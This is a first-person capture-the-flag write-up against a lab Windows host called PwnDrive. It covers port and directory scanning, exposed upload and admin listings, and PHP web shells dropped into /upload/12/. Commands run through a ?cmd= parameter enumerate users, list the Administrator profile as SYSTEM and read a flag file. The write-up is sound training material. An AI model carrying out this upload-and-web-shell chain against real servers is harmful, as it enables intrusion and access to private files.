1. Reconnaissance

conducted a comprehensive port scan which revealed a Windows-based server running a variety of services including FTP (Xlight), Apache with PHP, MySQL (MariaDB), MS SQL Server 2012, and SMB. This provided me with a broad attack surface to investigate for potential vulnerabilities.
   
<pre>
> nmap -sC -sV -Pn -vv 10.150.150.11

PORT      STATE SERVICE      REASON          VERSION
21/tcp    open  ftp          syn-ack ttl 127 Xlight ftpd 3.9
80/tcp    open  http         syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 3345FF745865D02B994859241BCE2B36
|_http-title: PwnDrive - Your Personal Online Storage
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:     a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1:   b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| SHA-256: 0169 7338 0c0f 1df0 0bd9 593e d8d5 efa3 706c d6df 7993 f614 1272 b805 22ac dd23

  ssl-date: 2026-04-15T22:32:06+00:00; +13m37s from scanner time.
| ms-sql-info: 
|   10.150.150.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2012 RTM
|       number: 11.00.2100.00
|       Product: Microsoft SQL Server 2012
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.150.150.11:1433: 
|     Target_Name: PWNDRIVE
|     NetBIOS_Domain_Name: PWNDRIVE
|     NetBIOS_Computer_Name: PWNDRIVE
|     DNS_Domain_Name: PwnDrive
|     DNS_Computer_Name: PwnDrive
|_    Product_Version: 6.1.7601
3306/tcp  open  mysql        syn-ack ttl 127 MariaDB 5.5.5-10.4.14
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.14-MariaDB
|   Thread ID: 16
|   Capabilities flags: 63486
|   Some Capabilities: LongColumnFlag, Speaks41ProtocolNew, SupportsTransactions, FoundRows, Support41Auth, ConnectWithDatabase, DontAllowDatabaseTableColumn, ODBCClient, SupportsCompression, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: YD(8!:@tIM*('+DTW;_O
|_  Auth Plugin Name: mysql_native_password
3389/tcp  open  tcpwrapped   syn-ack ttl 127
|_ssl-date: 2026-04-15T22:32:04+00:00; +13m36s from scanner time.
| ssl-cert: Subject: commonName=PwnDrive
| Issuer: commonName=PwnDrive
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2026-04-14T22:00:34
| Not valid after:  2026-10-14T22:00:34
| MD5:     af7f cc69 7f05 a418 100d 664d 55a0 a4c1
| SHA-1:   f24b 0326 592a b13b c4bc 1669 adb0 fbc2 31d4 57dd
| SHA-256: e324 cfa9 14df 4bf1 2ff7 0ed4 ddc4 a54a 43f2 3e4c 83a9 a3a6 df87 bbb6 5f42 685a

  rdp-ntlm-info: 
|   Target_Name: PWNDRIVE
|   NetBIOS_Domain_Name: PWNDRIVE
|   NetBIOS_Computer_Name: PWNDRIVE
|   DNS_Domain_Name: PwnDrive
|   DNS_Computer_Name: PwnDrive
|   Product_Version: 6.1.7601
|_  System_Time: 2026-04-15T22:31:50+00:00
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: PWNDRIVE, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:89:87:cb (VMware)
| Names:
|   PWNDRIVE<00>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   PWNDRIVE<20>         Flags: <unique><active>
| Statistics:
|   00 0c 29 89 87 cb 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_clock-skew: mean: 1h13m36s, deviation: 2h38m45s, median: 13m36s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 (Windows Server 2008 R2 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: PwnDrive
|   NetBIOS computer name: PWNDRIVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-04-15T15:31:50-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52298/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 58222/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 22295/udp): CLEAN (Timeout)
|   Check 4 (port 37705/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-04-15T22:31:50
|_  start_date: 2024-03-21T12:57:13
</pre>

| Service | Port | What can be done (commands / next step) | Findings |
|--------|------|------------------------------------------|----------|
| FTP | 21 | `ftp 10.150.150.11` → try anonymous login (`anonymous:anonymous`) | failed fetch the password |
|  |  | `nmap -p21 --script ftp-anon,ftp-syst 10.150.150.11` | nothing to see or do here |
| HTTP | 80 | Open in browser: `http://10.150.150.11` | Lead to a website called PwnDrive |
|  |  | `gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt` | Lead to full list of directory |

2. Scanning and Enumeration

 By performing directory enumeration, I identified critical paths such as /admin/, /upload/, and /phpmyadmin/. 
 These findings pointed me toward potential areas for unauthorized file manipulation or administrative access.
 
<pre>
> gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt
  
tarting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 1045]
.hta                 (Status: 403) [Size: 1045]
.htpasswd            (Status: 403) [Size: 1045]
admin                (Status: 301) [Size: 338] [--> http://10.150.150.11/admin/]
Admin                (Status: 301) [Size: 338] [--> http://10.150.150.11/Admin/]
ADMIN                (Status: 301) [Size: 338] [--> http://10.150.150.11/ADMIN/]
aux                  (Status: 403) [Size: 1045]
cgi-bin/             (Status: 403) [Size: 1059]
com1                 (Status: 403) [Size: 1045]
com2                 (Status: 403) [Size: 1045]
com3                 (Status: 403) [Size: 1045]
components           (Status: 301) [Size: 343] [--> http://10.150.150.11/components/]
con                  (Status: 403) [Size: 1045]
css                  (Status: 301) [Size: 336] [--> http://10.150.150.11/css/]
examples             (Status: 503) [Size: 1059]
favicon.ico          (Status: 200) [Size: 104623]
img                  (Status: 301) [Size: 336] [--> http://10.150.150.11/img/]
inc                  (Status: 301) [Size: 336] [--> http://10.150.150.11/inc/]
index.php            (Status: 200) [Size: 4036]
licenses             (Status: 403) [Size: 1204]
lpt1                 (Status: 403) [Size: 1045]
lpt2                 (Status: 403) [Size: 1045]
nul                  (Status: 403) [Size: 1045]
phpmyadmin           (Status: 403) [Size: 1204]
prn                  (Status: 403) [Size: 1045]
server-info          (Status: 403) [Size: 1204]
server-status        (Status: 403) [Size: 1204]
upload               (Status: 301) [Size: 339] [--> http://10.150.150.11/upload/]
utils                (Status: 301) [Size: 338] [--> http://10.150.150.11/utils/]
vendor               (Status: 301) [Size: 339] [--> http://10.150.150.11/vendor/]
webalizer            (Status: 403) [Size: 1045]
</pre>

3. Directory Listing (/upload/)
   
I navigated to the discovered /upload/ directory and found an open index with several numbered subdirectories. This indicated that the server allowed me to browse and potentially interact with previously uploaded content.

<pre>
>http://10.150.150.11/upload/
  
Index of /upload
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory 	 	- 	 
[DIR]	2/ 	2020-11-17 05:42 	- 	 
[DIR]	10/ 	2020-11-16 10:44 	- 	 
[DIR]	11/ 	2026-04-15 15:44 	- 	 
Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9 Server at 10.150.150.11 Port 80
</pre>

Directory Listing (/admin/)
I accessed the /admin/ path, which exposed PHP source files like manageusers.php and addedituser.php via directory listing. This suggested to me a significant lack of proper access controls or index page protections on the administrative backend.

<pre>
>http://10.150.150.11/admin/
  
Index of /admin
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory 	 	- 	 
[TXT]	addedituser.php 	2020-11-16 10:38 	3.4K	 
[TXT]	deleteuser.php 	2020-11-16 10:38 	932 	 
[TXT]	manageusers.php 	2020-11-16 10:38 	2.0K	 
Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9 Server at 10.150.150.11 Port 80
</pre>

<img width="739" height="484" alt="578897639-b00b9b36-481e-44ac-86ee-5b9ba575bf62" src="https://github.com/user-attachments/assets/b7ed4894-d9b3-4e05-83de-f41e56b65867" />


4. Initial Shell Verification

   I confirmed the presence of a file named rshell.php within one of the upload subdirectories. This marked my first successful stage in establishing a persistent web-based foothold on the target.
   
<pre>
>http://10.150.150.11/upload/12/
  
Index of /upload/12
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory 	 	- 	 
[TXT]	rshell.php 	2026-04-15 15:54 	75 	 
Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9 Server at 10.150.150.11 Port 80
</pre>

5. Payload Expansion
   
I inspected the upload directory further and found additional tools, including a full php-reverse-shell.php and a simple.php file. I used these to escalate my attack from simple file presence to interactive command execution.

<pre>
  Index of /upload/12
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory 	 	- 	 
[TXT]	php-reverse-shell.php 	2026-04-15 16:25 	5.4K	 
[TXT]	simple.php 	2026-04-15 16:31 	40 	 
</pre>

6. Web Shell Error Confirmation
   
When I accessed simple.php without parameters, it triggered PHP errors. This was a positive sign for me, as it confirmed the script was functional and actively waiting for a specific command-line argument (cmd) to execute instructions.

<pre>
>http://10.150.150.11/upload/12/simple.php
  
  Notice: Undefined index: cmd in C:\xampp\htdocs\upload\12\simple.php on line 1

Warning: shell_exec(): Cannot execute a blank command in C:\xampp\htdocs\upload\12\simple.php on line 1
</pre>

7. Code Execution (whoami)
   
By appending ?cmd=whoami to the URL, I confirmed that I had obtained the highest possible privilege level: nt authority\system. This verified that my web shell process had full administrative control over the local machine.

<pre>
>http://10.150.150.11/upload/12/simple.php?cmd=whoami
  
  nt authority\system 
</pre>

8. System Identification (hostname)
   
I executed the hostname command through the web shell to confirm the identity of the target. This verified that I was indeed working on the machine named PwnDrive.

<pre>
  >http://10.150.150.11/upload/12/simple.php?cmd=hostname

  PwnDrive
</pre>

9. User Enumeration (net user)
    
I ran the net user command to list all local accounts on the system. This allowed me to identify specific targets for further data exfiltration, specifically the users Administrator, Jboden, and tony.

<pre>
  >http://10.150.150.11/upload/12/simple.php?cmd=net%20user

  User accounts for \\ ------------------------------------------------------------------------------- Administrator Guest Jboden tony The command completed with one or more errors. 
</pre>

10. Filesystem Exploration (Users)
    
I performed a directory listing of C:\Users to see the profiles stored on the machine. Identifying a Classic .NET AppPool and a MSSQL instance helped me map out the software environment and where user data might be located.

<pre>
  http://10.150.150.11/upload/12/simple.php?cmd=dir%20C:\Users

  Volume in drive C has no label. Volume Serial Number is F80A-FDD9 Directory of C:\Users 07/16/2020 06:44 AM
. 07/16/2020 06:44 AM
  .. 06/27/2016 12:21 AM
    Administrator 06/27/2016 02:05 AM
      Classic .NET AppPool 03/28/2020 09:01 AM
        Jboden 06/27/2016 01:58 AM
          MSSQL$SQLEXPRESS 07/13/2009 09:57 PM
            Public 07/16/2020 06:44 AM
              tony 0 File(s) 0 bytes 8 Dir(s) 21,045,178,368 bytes free 
</pre>

11. Administrator Directory Access
    
Despite it being a restricted folder, I was able to list the contents of the Administrator profile. This proved that my current system-level shell effectively bypassed all standard Windows file permissions.

<pre>
  >http://10.150.150.11/upload/12/simple.php?cmd=dir%20C:\Users\Administrator

Volume in drive C has no label. Volume Serial Number is F80A-FDD9 Directory of C:\Users\Administrator 06/27/2016 12:21 AM
. 06/27/2016 12:21 AM
  .. 06/27/2016 12:21 AM
    Contacts 11/17/2020 07:19 AM
      Desktop 06/27/2016 12:21 AM
        Documents 08/24/2020 05:59 AM
          Downloads 06/27/2016 12:21 AM
            Favorites 06/27/2016 12:21 AM
              Links 06/27/2016 12:21 AM
                Music 06/27/2016 12:21 AM
                  Pictures 06/27/2016 12:21 AM
                    Saved Games 06/27/2016 12:21 AM
                      Searches 06/27/2016 12:21 AM
                        Videos 0 File(s) 0 bytes 13 Dir(s) 21,045,178,368 bytes free   
</pre>

12. Flag Location Discovery
    
I navigated into the Administrator's desktop and discovered the existence of FLAG1.txt alongside a shortcut for the Xlight FTP Server. This helped me pinpoint the exact location of my primary objective.

<pre>
  >http://10.150.150.11/upload/12/simple.php?cmd=dir%20C:\Users\Administrator\Desktop

  . 11/17/2020 07:19 AM
    .. 11/17/2020 07:20 AM 30 FLAG1.txt 08/11/2020 08:29 AM 979 Xlight FTP Server.lnk 2 File(s) 1,009 bytes 2 Dir(s) 21,045,178,368 bytes free 
</pre>

13. Final Objective Acquisition
    
Using the type command, I read the contents of Flag1.txt and successfully retrieved the sensitive "PwnTillDawn" string. This completed my initial phase of the penetration test and secured the first flag.

<pre>
  >http://10.150.150.11/upload/12/simple.php?cmd=type%20C:\Users\Administrator\Desktop\Flag1.txt

  FLAG1 = PwnTillDawnAcademyIsAwesome!!!
</pre>
